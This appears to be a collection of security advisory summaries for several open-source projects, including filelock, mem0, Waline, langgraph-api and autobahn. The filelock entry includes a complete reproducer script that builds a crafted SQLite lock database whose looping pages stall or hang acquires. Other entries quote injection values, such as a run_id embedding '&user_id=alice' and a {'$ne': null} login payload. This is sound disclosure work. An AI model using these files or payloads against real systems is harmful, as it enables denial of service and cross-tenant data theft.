items.summary:
`ReadWriteLock` and `AsyncReadWriteLock` (the SQLite-backed reader/writer lock) run `PRAGMA journal_mode=MEMORY` on a fresh connection for every acquire. That statement makes SQLite load the whole schema (the `sqlite_master` table, which lists every table and index with its `CREATE` text) of whatever file sits at the lock path. The caller's `timeout` reaches SQLite only as `busy_timeout`, which bounds waits for another connection's lock, not schema loading. The only content checks reject non-regular files and WAL mode (write-ahead log, an SQLite mode that keeps changes in a side file). A local user who can place or overwrite the file at a `ReadWriteLock`'s database path can therefore make every `acquire_read` / `acquire_write` of every process using that lock ignore its `timeout` and `blocking=False`. That position needs a non-sticky shared directory, or a database owned by the user running the lock (below: the lock user) that other users may write.

One 37 KB crafted file stalls each acquire for as long as its author chooses while the process allocates about 1 GB. A second 28 KB layout makes the acquire of a free lock run without end, spinning at 100% CPU and ignoring Ctrl-C. The effect is availability only: the other user reads nothing and corrupts nothing. Affected versions are filelock 3.20.4 through 4.2.0.

Anthropic's OSS Scanner reported this in private as `ANT-2026-NFPRHMYJ` [medium, CWE-400]: ReadWriteLock: crafted lock database hangs acquire regardless of timeout.

## Severity

**CVSS 3.1 `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H` scores 5.5 (Medium).** `AV:L` (local): the other user needs an account on the same host. `PR:L` (low privileges): an ordinary account is enough. `AC:L` (low attack complexity): the other user plants one file; no race. `UI:N` (no user interaction). `A:H` (high availability impact): every acquire of every process using the lock runs for as long as that user chose, or does not return, with `timeout` and `blocking=False` ignored and `SIGINT` not delivered, so only killing the process ends it. `C:N` and `I:N` (no confidentiality or integrity impact): the other user reads nothing and corrupts nothing. `S:U` (scope unchanged).

Classification from the external review: **conditional security**, an availability concern only when an untrusted actor can supply the database file (it needs a writable or replaceable database path). The scanner rated it medium. The review agrees with the mechanism and the precondition.

## Scope and preconditions

- The other party is a different local account that can create or replace the file at the lock path. One way: the lock directory is writable by that account and not sticky (the sticky bit is a directory flag that lets only a file's owner remove or rename it), for example a group-writable project or cache directory. There the account can be the first to create the database, or rename the lock user's database aside and put the crafted one in its place. The other way: the lock user's own database is writable by that account (`0666`), which is the setup a lock shared between accounts needs. In a `1777` directory the scanner wrote the crafted file over such a database in place, and the lock user's next acquire hung. The lock user must be able to open the file read-write, so a file the other user creates is `0666`.
- Sticky directories and kernel settings. In a sticky world-writable directory such as `/tmp`, Linux with `fs.protected_regular=2` (a kernel setting) refuses the lock user's `O_CREAT` open of a file owned by the other account with `EACCES`. A database owned by the other user does not work there. That does not cover a `0666` database owned by the lock user. The scanner did not test systems with `fs.protected_regular=0` (the kernel's own default).
- Platform. Every platform runs the same statements. On Windows the documentation already requires a lock directory that untrusted users cannot write, so the shared-directory setup is outside what the project supports there.
- Ancestor boundary. Protection against another local user is possible only while no other user can replace the lock's directory or any of its ancestors. That holds when each ancestor belongs to the user or root and is either not writable by others or sticky.

## Affected code

At the scanned commit `b831496b0273`: [`_configure_and_begin` runs `PRAGMA busy_timeout=...; PRAGMA journal_mode=MEMORY;` on a fresh connection](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L814-L816), and for a read lock [`SELECT name FROM sqlite_master LIMIT 1` at line 832](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L832). The code in [`_do_acquire_inner` closes the previous connection and opens a new one on every acquire](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L745-L754). The only content checks are [`_open_lock_database`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1079-L1091) (regular file) and [`_raise_if_wal`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1094-L1101) (20 header bytes).

## Introduced

The acquire path dates from `cfd4446` ("feat(lock): add SQLite-based ReadWriteLock (#399)", 2026-02-12), first released in **3.20.4** (verified: `git tag --contains cfd4446` gives 3.20.4). Since #657 (3.30.0) the lock reopens the connection on every acquire, so the stall repeats on every acquire rather than once per instance.

## Mechanism

`PRAGMA journal_mode=MEMORY` is the first statement that needs the schema. SQLite reads every row of `sqlite_master` and parses each row's `sql` text there. Run one at a time on the crafted file, `PRAGMA busy_timeout` returns at once and `PRAGMA journal_mode=MEMORY` takes the whole time. The read-mode `SELECT` needs the schema too. The caller's `timeout` reaches SQLite only as `busy_timeout` (lines 814 to 816 and 823 to 826), which limits how long SQLite waits for another connection's file lock. Loading the schema is not a wait, so nothing limits it. `blocking=False` and `timeout=0` reach SQLite as `busy_timeout=0` and stall the same way (2.4 s each with a 5-row file). `acquire_write` runs the same pragma. `AsyncReadWriteLock.read_lock(timeout=1)` stalls the same way (4.7 s with 10 rows; wrapping the acquire in `asyncio.wait_for(..., 2)` does not return earlier). A second `acquire_read` on the same instance stalls for as long as the first.

The constructor is not affected. Its validation connection (lines 484 and 485) runs no statement, so the lock user sees nothing until the first acquire. A stack dump taken 2 s into the stall shows the thread in `_configure_and_begin` at the `executescript` call. The lock accepts any SQLite file that is a regular file and not in WAL mode, whoever created it. Two layouts reach the load, at the same statement and with the same preconditions.

**Long schema rows.** Each `sqlite_master` row is `('table', 't0001', 't0001', 2, 'CREATE TABLE t0001(x) --AAAA…')` with an `sql` text of 999,999,024 bytes, under SQLite's 1,000,000,000-byte limit. The file does not store the text. Each row's cell names page 2 as its first overflow page (a page that holds the part of a row too large for its own page), and the "next overflow page" field of page 2 names page 2 again. SQLite builds each row from the same 4 KB page, read about 244,000 times over. The header claims 244,142 pages, because SQLite rejects a record larger than page size times page count. The script extends the file to that length as a hole (unallocated space that reads as zeros), because SQLite also rejects a file shorter than its header claims. Eight rows fit in one 4 KB leaf page. The statements are valid `CREATE TABLE`s, so SQLite reports no error, and after the stall the acquire succeeds; it does not raise `Timeout`.

Measured with `read_lock(timeout=1)`: 1 row, 12,288 bytes on disk, returns after 0.6 s; 10 rows, 16,384 bytes, 4.8 s; 50 rows, 36,864 bytes, 23 s. Peak RSS (resident set size, the memory the process holds) is 981 MB in every case, because memory stays at one row's worth; the cost is about 0.47 s per row. Under a 512 MiB address-space limit the same acquire raises `MemoryError` from line 816.

**Looping interior pages.** The long rows are one way in, not the cause: SQLite loads whatever schema the file holds, with no bound. A 20 KB file with no long rows, whose three index pages each point 200 times at the same child page (8,000,000 leaves), stalls `read_lock(timeout=1)` for 8 s with 10 MB of memory. Each extra level multiplies the time by the fan-out (the number of children per page).

At the largest fan-out SQLite accepts, the stall becomes a hang. In a 28,672-byte file of seven 4 KB pages, pages 1 to 6 are `sqlite_master` interior pages whose 660 cell pointers all name one 5-byte cell. That cell's child and the page's right-most child are both the next page, and page 7 is a leaf with one row of five NULLs. SQLite 3.40.1 refuses a page with more than 681 cells and a tree deeper than 20 pages, but does not notice that it reaches a page more than once. Each level therefore multiplies the rows of `sqlite_master` by 661.

The row is not a valid schema entry, and that does not stop the scan: SQLite raises `sqlite3.DatabaseError: malformed database schema (?)` only after the last row. One level raises `DatabaseError` at once. Two levels (12 KiB) give 436,921 rows after 0.16 s. Six levels (28 KiB) give 661⁶, about 8 × 10¹⁶ rows, still at line 816 with 30 s of CPU time used when killed after 30 s. On that file `acquire_write(timeout=1)`, `acquire_read(blocking=False)` and `acquire_read(timeout=0)` spin on the same line. `SIGINT` does not raise `KeyboardInterrupt` (the process was still running at 100% CPU 4 s after `kill -INT`), because the thread does not leave the one SQLite call.

## Reproduction

The scanner's reproducer for `ANT-2026-NFPRHMYJ`, quoted as received. It ran against commit `b831496b0273`.

**`repro`**

```python
#!/usr/bin/env python3
import os
import resource
import shutil
import subprocess
import sys
import time

# set up: a cache directory both accounts can write, without the sticky bit
shared_dir = "/tmp/shared-cache"
shutil.rmtree(shared_dir, ignore_errors=True)
os.mkdir(shared_dir)
os.chmod(shared_dir, 0o777)
lock_db = f"{shared_dir}/cache.lock.db"

# attack: the attacker creates the lock database first, with 50 schema rows
subprocess.run(
    [sys.executable, "/tmp/repro.d/make_stalling_db.py", lock_db, "50"],
    user="attacker", group="attacker", extra_groups=[], check=True,
)
print("lock database uses", os.stat(lock_db).st_blocks * 512, "bytes of disk", flush=True)

# victim: an application takes the read lock with a one-second timeout
started = time.monotonic()
subprocess.run(
    [sys.executable, "/tmp/repro.d/victim_reader.py", lock_db],
    user="victim", group="victim", extra_groups=[], timeout=600,
)
victim_ran_for = time.monotonic() - started

# check: with timeout=1 the victim must be done within about a second, either holding the lock or with Timeout
victim_peak_rss_mb = resource.getrusage(resource.RUSAGE_CHILDREN).ru_maxrss // 1024  # the victim is the largest child
print(f"victim process ran for {victim_ran_for:.1f} s, peak RSS {victim_peak_rss_mb} MB")
print("BUG" if victim_ran_for > 10 else "OK")
```

**`repro.d/make_stalling_db.py`**

```python
#!/usr/bin/env python3
# usage: make_stalling_db.py <database path> <number of schema rows>
#
# Writes a SQLite database whose sqlite_master rows each carry ~1 GB of `sql` text, stored in a few 4 KB pages:
# every row's text continues on one overflow page whose "next overflow page" field names itself.
import os
import struct
import sys

database, schema_rows = sys.argv[1], int(sys.argv[2])

PAGE_SIZE = 4096
LOOP_PAGE = 2
COMMENT_LEN = 999_999_000  # keeps each sql text just under SQLite's 1,000,000,000-byte string limit
CLAIMED_PAGES = COMMENT_LEN // PAGE_SIZE + 2  # SQLite refuses a record longer than page size x pages in the file
TABLE_INTERIOR_PAGE, TABLE_LEAF_PAGE = 0x05, 0x0D


def varint(value):
    groups = [value & 0x7F]
    while value := value >> 7:
        groups.insert(0, value & 0x7F | 0x80)
    return bytes(groups)


def schema_row_cell(rowid):
    # the row ('table', name, name, 2, 'CREATE TABLE name(x) --AAAA...'): a valid statement, so SQLite reports no error
    name = b"t%04d" % rowid
    sql_start = b"CREATE TABLE " + name + b"(x) --"
    sql_len = len(sql_start) + COMMENT_LEN
    serial_types = b"".join(varint(t) for t in [13 + 2 * 5, 13 + 2 * len(name), 13 + 2 * len(name), 1, 13 + 2 * sql_len])
    record_start = varint(1 + len(serial_types)) + serial_types + b"table" + name + name + b"\x02" + sql_start
    record_len = len(record_start) + COMMENT_LEN
    # the file format's rule for how much of an overflowing table-leaf record stays on the leaf page
    min_local, max_local = (PAGE_SIZE - 12) * 32 // 255 - 23, PAGE_SIZE - 35
    local = min_local + (record_len - min_local) % (PAGE_SIZE - 4)
    if local > max_local:
        local = min_local
    return varint(record_len) + varint(rowid) + record_start.ljust(local, b"A") + struct.pack(">I", LOOP_PAGE)


def btree_page(page_type, cells, right_child=b"", header_offset=0):
    page = bytearray(PAGE_SIZE)
    content_start = PAGE_SIZE
    cell_pointers = b""
    for cell in cells:
        content_start -= len(cell)
        page[content_start : content_start + len(cell)] = cell
        cell_pointers += struct.pack(">H", content_start)
    header = struct.pack(">BHHHB", page_type, 0, len(cells), content_start, 0) + right_child + cell_pointers
    page[header_offset : header_offset + len(header)] = header
    return page


# pages 3 and up: the leaves of sqlite_master, about eight rows each
cells = [schema_row_cell(rowid) for rowid in range(1, schema_rows + 1)]
rows_per_leaf = (PAGE_SIZE - 8) // (len(cells[0]) + 2)
leaves = [btree_page(TABLE_LEAF_PAGE, cells[i : i + rows_per_leaf]) for i in range(0, schema_rows, rows_per_leaf)]

# page 2: the overflow page, pointing at itself, then 4092 bytes of comment text
loop_page = struct.pack(">I", LOOP_PAGE) + b"A" * (PAGE_SIZE - 4)

# page 1: the database header, then the root of sqlite_master with one child per leaf
first_leaf, last_leaf = 3, 3 + len(leaves) - 1
children = [struct.pack(">I", first_leaf + i) + varint((i + 1) * rows_per_leaf) for i in range(len(leaves) - 1)]
root_page = btree_page(TABLE_INTERIOR_PAGE, children, right_child=struct.pack(">I", last_leaf), header_offset=100)
root_page[:100] = b"".join([
    b"SQLite format 3\0",
    struct.pack(">H", PAGE_SIZE),
    bytes([1, 1]),  # file format versions: rollback journal, not WAL (which ReadWriteLock refuses)
    bytes([0, 64, 32, 32]),  # reserved bytes per page and the three fixed payload fractions
    struct.pack(">I", 1),  # file change counter
    struct.pack(">I", CLAIMED_PAGES),  # database size in pages
    struct.pack(">II", 0, 0),  # no freelist
    struct.pack(">II", 1, 4),  # schema cookie, schema format
    struct.pack(">II", 0, 0),  # default cache size, no auto-vacuum
    struct.pack(">I", 1),  # text encoding: UTF-8
    struct.pack(">III", 0, 0, 0),  # user version, incremental vacuum, application id
    bytes(20),
    struct.pack(">I", 1),  # version-valid-for equals the change counter, so SQLite trusts the page count above
    struct.pack(">I", 3040001),  # SQLite version that wrote the file
])

with open(database, "wb") as file:
    file.write(root_page + loop_page + b"".join(leaves))
    written = file.tell()
    file.truncate(CLAIMED_PAGES * PAGE_SIZE)  # SQLite also refuses a file shorter than it claims; this stays a hole
os.chmod(database, 0o666)  # the victim's ReadWriteLock opens the database read-write
print(f"attacker: wrote {database}: {schema_rows} schema rows in {written} bytes, apparent size {CLAIMED_PAGES * PAGE_SIZE}")
```

**`repro.d/victim_reader.py`**

```python
import sys
import time

from filelock import ReadWriteLock, Timeout

lock = ReadWriteLock(sys.argv[1])
started = time.monotonic()
try:
    with lock.read_lock(timeout=1):
        outcome = "acquired"
except Timeout:
    outcome = "timed out"
print(f"victim: read_lock(timeout=1) {outcome} after {time.monotonic() - started:.1f} s")
```

## Failure sequence

```mermaid
flowchart TB
    P0["other user puts a crafted SQLite file at the lock path (mode 0666), or overwrites a 0666 database owned by the lock user"] --> P1["lock user's acquire_read(timeout=1) opens a fresh connection, header is not WAL so it is accepted"]
    P1 --> P2["PRAGMA busy_timeout then PRAGMA journal_mode=MEMORY loads all of sqlite_master, busy_timeout does not apply to schema loading"]
    P2 --> P3["50 rows of ~1 GB through one self-referencing overflow page: returns after 24.6 s at 981 MB RSS, lock granted, no Timeout"]
    P2 --> P4["6 interior levels pointing at one child (28 KiB): 661^6 rows, does not return, 100% CPU, SIGINT ignored, process must be killed"]
    classDef ok fill:#d8f3dc,stroke:#2d6a4f,color:#1b4332;
    classDef bad fill:#ffd6d6,stroke:#c1121f,color:#5c0000;
    classDef info fill:#cfe4ff,stroke:#1f6feb,color:#0b1f3a;
    class P0,P1,P2 info;
    class P3,P4 bad;
```

## Evidence

The scanner's reproducer runs as root and drops to `attacker` and `victim`. It recreates `/tmp/shared-cache` with mode `0777` and no sticky bit. It runs `make_stalling_db.py /tmp/shared-cache/cache.lock.db 50` as `attacker`. That script writes the header and the `sqlite_master` root on page 1, the self-referencing overflow page on page 2, and leaf pages holding 50 valid `CREATE TABLE tNNNN(x) --AAAA…` rows whose text runs to under 1 GB through page 2, extended to the claimed page count as a hole, mode `0666`. It then runs `victim_reader.py` (`ReadWriteLock(path)` and one `with lock.read_lock(timeout=1):`) as `victim` and times it:

```
attacker: wrote /tmp/shared-cache/cache.lock.db: 50 schema rows in 36864 bytes, apparent size 1000005632
lock database uses 36864 bytes of disk
victim: read_lock(timeout=1) acquired after 24.6 s
victim process ran for 24.8 s, peak RSS 981 MB
BUG
```

The verdict is `BUG` when the `victim` process, whose only work is an acquire with a one-second timeout, ran for more than 10 s. A separate script in the report (`looping_db.py`) builds the looping file; the same `victim_reader.py` run on it as `victim` does not return. A `victim` process that had already used the lock stalled on its next acquire after the other user swapped the file under it. In a `1777` directory a `0666` database owned by `victim`, overwritten in place with the looping file, hung the next acquire.

Our verification: `BUG` on the scanned commit `b831496` and on the 4.2.0 image (`e2e7d70`). On the PR #834 head the `victim` process stops with a `ValueError` after 0.1 s at 24 MB peak RSS and the reproducer prints `OK`.

## Impact

Another local user who can create or replace the lock database makes every `acquire_read` / `acquire_write` of every process using that `ReadWriteLock` run for a time of their choosing (about 500 bytes of disk per extra half second) while allocating about 1 GB, or not return at all, regardless of `timeout` or `blocking=False`. This goes beyond what holding the lock gives that user, because a held lock ends in `Timeout` when the caller's timeout runs out, and this does not. With the looping-page layout the acquiring thread spins at 100% of one CPU on a free lock, `Timeout` is not raised, Ctrl-C does not interrupt it, and only killing the process ends it. It is a denial of service of the lock user's process only: it reads nothing and corrupts nothing, and in the long-row case the lock is still granted afterwards.

## Workarounds

- Keep the `ReadWriteLock` database in a directory that only the locking account (or root) can write, with no group or other write bit. Make sure every ancestor belongs to that account or root and is either not writable by others or sticky.
- Do not give the lock a database another account may write. The lock creates its database `0600`, and leaving it that way keeps other accounts from supplying its content. A lock shared between accounts through a `0666` database stays reachable even in `/tmp`.
- If a stall or hang appears, the file at the lock path is the cause; replacing it with an empty file restores the lock.

4.2.1.

items.summary:
Summary

_build_session_scope() in mem0/memory/main.py builds the conversation-history scope key used to fetch/store the last N raw messages by naively joining caller-supplied user_id/agent_id/run_id values with unescaped & and = delimiters:

def _build_session_scope(filters):
    parts = []
    for key in sorted(["user_id", "agent_id", "run_id"]):
        val = filters.get(key)
        if val:
            parts.append(f"{key}={val}")
    return "&".join(parts)

_validate_and_trim_entity_id() (the only validation applied to these values) rejects only empty/whitespace-only strings — it never forbids & or =. This scope string is then used as an exact-match key against a SQLite column (storage.py: WHERE session_scope = ?) to fetch the last 10 raw messages for a given scope (main.py, Phase 0 of _add_to_vector_store, both sync and async).

Impact

Any caller who controls only their own run_id (or agent_id) — a very common integration shape, since apps frequently pass a client-/session-supplied identifier straight through as run_id without namespacing — can craft a value containing &user_id=<victim> (or &agent_id=<victim>) that produces a scope string byte-for-byte identical to a different tenant's real scope string.

Concretely: Tenant A calls add(msgs, user_id="alice", run_id="proj-x") → scope "run_id=proj-x&user_id=alice". An attacker who can only set run_id calls add(msgs, run_id="proj-x&user_id=alice") → identical scope string. The attacker's next add() call:

1. Reads Tenant A's raw prior conversation via get_last_messages(session_scope) and splices it verbatim into the attacker's own LLM fact-extraction prompt — a direct cross-tenant confidentiality leak (conversation content, potentially including PII, credentials, etc.).
2. Writes into the same colliding row-set via save_messages(), whose eviction logic (DELETE FROM messages WHERE session_scope = ? AND id NOT IN (...)) can evict/interleave Tenant A's history — permanent cross-tenant data corruption, not just a read.

Reachable via the public Memory.add() / AsyncMemory.add() API, and by extension the REST server's POST /memories endpoint (which takes run_id/agent_id straight from the request body).

Reproduction

from mem0.memory.main import _build_session_scope

# Tenant A: real user_id + run_id
scope_a = _build_session_scope({"user_id": "alice", "run_id": "proj-x"})
print(scope_a)  # "run_id=proj-x&user_id=alice"

# Attacker: controls only run_id, embeds a fake user_id inside it
scope_c = _build_session_scope({"run_id": "proj-x&user_id=alice"})
print(scope_c)  # "run_id=proj-x&user_id=alice"

assert scope_a == scope_c  # byte-for-byte collision

A full end-to-end proof (actual add() calls, no mocking of the vulnerable functions) confirms the attacker's subsequent add() call receives the victim's raw prior message content via get_last_messages.

Suggested Fix

Reject & and = in _validate_and_trim_entity_id(), alongside the existing whitespace check — this is the single validation chokepoint already used by every entry point (add, search, get_all, delete_all), so the fix is centralized. Alternatively/additionally, encode each component unambiguously (percent-encode each id, or use a length-prefixed/JSON-encoded scope key) so no valid-character combination in one field can ever collide with a different partition.

Also affected: TypeScript SDK (npm mem0ai)

The same flaw exists in mem0-ts/src/oss/src/memory/index.ts,
Memory.buildSessionScope(), which joins agent_id/run_id/user_id into the same
`key=value&key=value` string with the delimiters unescaped:

  private buildSessionScope(filters: SearchFilters): string {
    const parts: string[] = [];
    for (const key of ["agent_id", "run_id", "user_id"].sort()) {
      const val = (filters as any)[key];
      if (val) parts.push(`${key}=${val}`);
    }
    return parts.join("&");
  }

The scope string is used the same way, as an exact-match key into the messages
table via SQLiteManager.getLastMessages() and saveMessages(), so the identical
forge, cross-tenant read and eviction all apply.

Verified against the current releases as of 2026-07-26: pip mem0ai v2.0.14 and
npm mem0ai ts-v3.1.2 both still contain the unescaped join.

Reporter: Abhinav Singh (GitHub: OfficialAbhinavSingh)

In `view/index.php`, `webSiteRootURL` is returned verbatim by `Streamer::getStreamerURL()` in `objects/Streamer.php` and reaches navigation and form attributes; it also enters a single-quoted JavaScript string in `view/index.header.php`. It is not filtered by `objects/security.php`, while the `user` and `pass` fields are filtered only for single quotes, leaving double quotes and angle brackets capable of breaking out of their HTML attributes. In addition, `view/index.header.php` reflects POST fields using `json_encode` without `JSON_HEX_TAG`, allowing a closing script tag to break out, and `locale/function.php` stores the POST `lang` value in the session for unescaped reflection in `view/index.php`. An unauthenticated remote attacker who persuades a victim to open a crafted login link can execute arbitrary JavaScript in the encoder's origin. This can read the operator session identifier exposed in inline script, capture login credentials and perform actions as the operator against the encoder and its upstream platform. This issue is fixed in version 8.1.0.

items.summary:
In the Linux kernel, the following vulnerability has been resolved:

tipc: fix NULL deref in tipc_named_node_up() on empty publication list

User-space applications can bind a large number of service addresses to
one or more sockets. Each binding of a local-scope service address inserts
one entry (publication) into the TIPC name table. If the number of these
publications exceeds TIPC_MAX_PUBL (65535), protocol service types
(such as node state and link state) are no longer inserted into the name
table. This causes two issues:

1. User-space applications subscribing to node or link up/down events
   stop receiving notifications.

2. A NULL pointer dereference can occur:

   BUG: kernel NULL pointer dereference, address: 00000000000000d0
   ...
   CPU: 0 UID: 0 PID: 0 Comm: swapper/0 Not tainted 7.2.0-rc4-default+ #5 PREEMPT(full)
   ...
   RIP: 0010:tipc_named_node_up (./include/linux/skbuff.h:2251 net/tipc/name_distr.c:195 net/tipc/name_distr.c:221)
   ...
   Call Trace:
   <IRQ>
   tipc_node_write_unlock (net/tipc/node.c:428)
   tipc_rcv (net/tipc/node.c:934 net/tipc/node.c:2189)
   tipc_udp_recv (net/tipc/udp_media.c:389)

   Thread 1 (tipc_net_finalize) | Thread 2 (named_distribute)
   -----------------------------|-----------------------------
                                | ...
                                | list_for_each_entry(publ, pls, binding_node) {
                                | ...
                                | __skb_queue_tail(list, skb);
                                | ...
                                | }
                                | ...
                                | hdr = buf_msg(skb_peek_tail(list));
   ...                          |
   tipc_nametbl_publish();      |

   If 'tipc_nametbl_publish()' (Thread 1) fails because the number of
   local publications reaches TIPC_MAX_PUBL, list (Thread 2) will be empty. As a
   result, NULL is passed to 'buf_msg()', leading to a NULL pointer dereference.

Fix these issues by allowing protocol service types (node state, link state,
and topology server) to be inserted into the name table unconditionally.
This ensures that users subscribing to these types always receive
notifications. In addition, the maximum number of local user publications is
reduced to (TIPC_MAX_PUBL - 1). This ensures that the maximum bulk size
calculated in tipc_link_set_queue_limits() remains valid.

items.summary: Waline is a comment system with backend support. Prior to version 1.41.1, the login endpoint POST /api/token reads the email field from the request body without checking its type and passes it straight into the MongoDB storage query. When email is not a string (for example a JSON object such as {"$ne": null}), the MongoDB storage adapter's parseWhere silently DROPS the field rather than rejecting the request, producing an empty filter that matches ALL users. The endpoint then verifies the submitted password against the FIRST user returned (user[0]), which in Waline is the first-registered user — the site administrator. This is a PARTIAL authentication bypass, not a full one. The attacker still needs a valid password for that first user; this is not a zero-knowledge bypass and it does not disclose passwords. Its concrete effects are: (1) the email/identifier factor is removed for the administrator account, (2) user enumeration (a non-string email never fails the "no such user" branch), and (3) credential-stuffing amplification — an attacker can test a leaked or weak password against the administrator account without knowing the administrator's email. This issue has been patched in version 1.41.1.

items.summary:
## Summary

In affected versions of `langgraph-api` (the LangGraph Server runtime), the run-creation path authorized the assistant attached to a run using a different authorization event than the rest of the assistant-handling code paths. Direct assistant reads and cron creation dispatch the `assistants.read` authorization event; run creation dispatched `assistants.search` with an incomplete value. In deployments whose custom authorization handlers register only an `assistants.read` handler (without an `assistants.search` handler and without a global fallback handler), no handler was consulted on the run-creation path, the returned filter set was empty, and the owner constraint was omitted from the resulting query.

As a result, in those deployments a request to create a run could reference a private assistant owned by another user, even where direct assistant reads, assistant search, and cron creation against that assistant were correctly denied. The run-creation response merged the referenced assistant's `metadata`, `config`, and `context` into fields returned to the requesting user. These fields can carry sensitive configuration; the runtime encrypts them at rest for that reason.

We have no evidence of this behavior occurring in the wild.

## Affected users / systems

You may be affected if you:

- run `langgraph-api` (the LangGraph Server / Agent Server runtime, including via the LangGraph Platform Helm chart), and
- use custom authorization handlers that gate assistant access through an `assistants.read` or `assistants.search` handler rather than a global handler covering all assistant events.

Deployments without custom authorization handlers, or whose handlers apply an equivalent owner filter across all assistant events (for example through a global handler), are not affected.

## Impact

- Confidentiality: exposure of another user's private assistant `metadata`, `config`, and `context` through the run-creation response. These fields can contain sensitive configuration.
- Integrity: creation of a run associated with another user's private assistant, beyond the requesting user's authorization scope; the run is then carried out using that assistant's configuration.

## Patches / mitigation

Run creation, and the parallel cron-creation path, now dispatch the `assistants.read` authorization event in both the in-memory and gRPC/Postgres runtimes, matching direct assistant reads. Client-supplied run and cron metadata is no longer forwarded into that authorization event, so handlers receive a consistent value shape and determine access by returning an owner filter that is applied server-side. Fixed in `langgraph-api` 0.10.0.

This is a behavioral change for deployments with custom authorization handlers:

- Handlers that gated assistant access only through `assistants.search` during run creation are no longer consulted on that path; provide an equivalent `assistants.read` handler that returns the same owner filter.
- The metadata field on the `assistants.read` event during run and cron creation is no longer populated; handlers that read or stamped it should move that logic into the run/cron create handlers.

## Operational guidance

- Register an `assistants.read` handler (or a global handler covering it) that returns an owner-style filter, and confirm parity across the assistant read, search, and run/cron creation paths.
- Upgrade to a release containing this change.

items.summary:
## Summary

In affected versions of `langgraph-api` (the LangGraph Server runtime), a run or cron could be created with a relative webhook target. When the server later delivers such a webhook, it routes the request back into the same application through an in-process loopback transport that the authentication middleware treats as internal and does not authenticate. As a result, a relative webhook target could reach the server's own routes that operate on threads and runs without the authentication context that applies to ordinary external requests.

In deployments that scope threads and runs by owner, this could allow a request associated with one user to reach routes operating on another user's thread, resulting in creation of a run on (or modification of the state of) a thread owned by another user, even where the corresponding direct external requests were correctly denied. Limited metadata from the targeted thread may be incorporated into the created run record.

We have no evidence of this behavior occurring in the wild.

## Affected users / systems

You may be affected if you:

- run `langgraph-api` (the LangGraph Server / Agent Server runtime, including via the LangGraph Platform Helm chart),
- allow runs or crons to specify webhook targets, and
- rely on per-user authorization to separate threads and runs between users.

## Impact

- Integrity: creation of a run on, or modification of the state of, a thread owned by another user, beyond the requesting user's authorization scope.
- Confidentiality: limited exposure of another user's thread metadata, incorporated into the created run record.

## Patches / mitigation

The webhook URL policy now denies loopback delivery by default: the `webhooks.url.disable_loopback` policy defaults to enabled. This covers relative webhook targets routed through the in-process transport, as well as localhost-style hostnames, loopback address ranges, and hostnames that resolve into the loopback range. Deployments that legitimately deliver webhooks to a route hosted on the same process can opt back in by setting `webhooks.url.disable_loopback: false` in `langgraph.json` (or the equivalent `LANGGRAPH_WEBHOOKS` configuration); do so only when you control the routes those webhooks reach, as they are delivered without authentication. Fixed in `langgraph-api` 0.10.0.

## Operational guidance

- Upgrade to a release containing this change and keep loopback webhook delivery disabled unless required.
- If loopback delivery is enabled, restrict it to routes you control and apply authorization within those routes.

items.summary:
## Summary

With `SslMode` set to `VerifyCA` or `VerifyFull` with no configured CA certificate, an unvalidated TLS connection is treated as secure and a clear-text password can be sent before the certificate is checked. This can occur when relying on the password to validate a self-signed cert, e.g., MariaDB's [zero-configuration TLS](https://mariadb.com/docs/server/security/encryption/data-in-transit-encryption/zero-configuration-ssl).

## Impact

An attacker who can deploy a man-in-the-middle MySQL proxy presenting any self-signed certificate can capture the plaintext database password of a client that:

- uses `SslMode = VerifyCA` or `VerifyFull`, and
- does not use the `SslCa` connection string option, and
- uses a non-empty password.

The attacker completes the TLS handshake with its own cert, requests a clear-text password authentication scheme (`mysql_clear_password`, or forces the `caching_sha2_password`/`sha256_password` clear-text fallback), and receives the password before the fingerprint check rejects the connection, defeating the man-in-the-middle protection `VerifyFull` is expected to provide. 

Not affected: a configured CA (`SslCa`), CA-validated TLS, local connections (Unix socket / loopback), or empty passwords. Using `SslMode` set to `Preferred` or `Required` is out of scope (this is documented as not authenticating the server).

## Workarounds

Provide `SslCa` with `VerifyCA`/`VerifyFull`, use a local/Unix-socket connection, or avoid clear-text authentication.

## References

- https://mariadb.org/mission-impossible-zero-configuration-ssl/

From 1.0.0 until Dashboards 4.2.2, and from 2.0.0 until Grid Pro 3.2.0, Highcharts DataTable single-cell writers use an untrusted column ID as a key without rejecting __proto__ or constructor. DataTable.setCell, including Dashboards connector write-back and Grid Pro editing paths, can therefore write integer-indexed values onto Object.prototype or the Object constructor. In Dashboards releases with column aliases, a literal __proto__ ID is redirected by the alias map, while an alias targeting __proto__ reaches the unsafe write; later releases without aliases accept the unsafe ID directly. Those inherited values affect array and object reads and for-in enumeration throughout the page, which can alter application control flow or disrupt rendering. Exploitation requires control of the table or component column ID and a cell, point, or API write. This issue is fixed in Dashboards 4.2.2 and Grid Pro 3.2.0.

### Summary

permessage-brotli inflates each frame fully before checking maxMessagePayloadSize, so one 421-byte frame makes the server allocate about 545 MiB even with a 1 MiB message limit (brotli expands about 1,000,000:1). Any unauthenticated client can exhaust server memory this way on servers that enable permessage-brotli. This bypasses the GHSA-hxp9-w8x3-p566 fix.

### Details

In 26.7.1 the receive path passes the remaining `maxMessagePayloadSize` budget to `decompress_message_data(..., max_output_len=...)`. deflate and bzip2 stop at that budget. `PerMessageBrotli.decompress_message_data` (`compress_brotli.py`) instead calls `self._decompressor.process(data)` with no limit and compares the length afterwards, so the whole frame is inflated first.

The code comment and changelog say this is still "bounded on the wire by `maxFramePayloadSize`", but brotli reaches about 1,000,000:1 (841 bytes inflate to 1 GiB), so that bound means little. A 421-byte frame against a 1 MiB budget peaks at 545 MiB before the 1009 rejection.

An autobahn asyncio server on 127.0.0.1 accepting permessage-brotli, with `maxFramePayloadSize=64 KiB` and `maxMessagePayloadSize=1 MiB`, received one small brotli frame from an autobahn client and peaked at 545 MiB (baseline 28 MiB). A few concurrent connections can exhaust memory.

